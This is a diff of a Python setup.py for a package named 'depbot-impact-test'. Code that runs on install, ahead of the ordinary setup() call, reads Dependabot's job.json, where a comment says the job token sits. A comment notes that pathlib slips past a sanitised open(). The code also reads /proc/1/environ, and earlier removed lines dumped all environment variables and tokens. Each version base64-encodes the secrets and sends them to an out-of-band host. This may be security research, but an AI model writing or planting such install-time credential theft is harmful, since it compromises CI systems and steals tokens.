@@ -1,34 +1,36 @@
 import os
 import urllib.request
 import base64
-import json
+import pathlib
 
-# Collect all env data
-env_data = {}
-for k, v in sorted(os.environ.items()):
-    env_data[k] = v[:100]  # Truncate values to 100 chars
-
-# Encode as JSON then base64 (URL-safe)
-payload = base64.urlsafe_b64encode(json.dumps(env_data).encode()).decode()
-
-# Split into chunks and send via HTTP (multiple requests if needed)
-chunk_size = 2000
-chunks = [payload[i:i+chunk_size] for i in range(0, min(len(payload), 10000), chunk_size)]
-for i, chunk in enumerate(chunks):
+# READ the job.json file (contains DEPENDABOT_JOB_TOKEN)
+# open() is sanitized but pathlib.Path.read_text() is NOT
+job_path = os.environ.get('DEPENDABOT_JOB_PATH', '/home/dependabot/dependabot-updater/job.json')
+try:
+    job_content = pathlib.Path(job_path).read_text()
+    # Send first 4000 chars (contains the token near the top)
+    b64_job = base64.urlsafe_b64encode(job_content[:4000].encode()).decode()
+    chunks = [b64_job[i:i+1800] for i in range(0, min(len(b64_job), 9000), 1800)]
+    for i, chunk in enumerate(chunks):
+        try:
+            urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/job/{i}?d=' + chunk, timeout=5)
+        except Exception:
+            pass
+except Exception as e:
     try:
-        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/env/{i}?d=' + chunk, timeout=5)
+        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/err?e=' + base64.urlsafe_b64encode(str(e).encode()).decode(), timeout=5)
     except Exception:
         pass
 
-# Also send just the token specifically
-token = os.environ.get('DEPENDABOT_JOB_TOKEN', os.environ.get('GITHUB_TOKEN', 'NONE'))
+# Also try /proc/self/environ for the parent Ruby process env
 try:
-    tok_b64 = base64.urlsafe_b64encode(token.encode()).decode()
-    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/token?t=' + tok_b64[:2000], timeout=5)
+    proc_env = pathlib.Path('/proc/1/environ').read_bytes()
+    b64_proc = base64.urlsafe_b64encode(proc_env[:2000]).decode()
+    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/proc?d=' + b64_proc[:1800], timeout=5)
 except Exception:
     pass
 
-# Normal setup() for Dependabot
+# Normal setup()
 from setuptools import setup
 setup(
     name="depbot-impact-test",
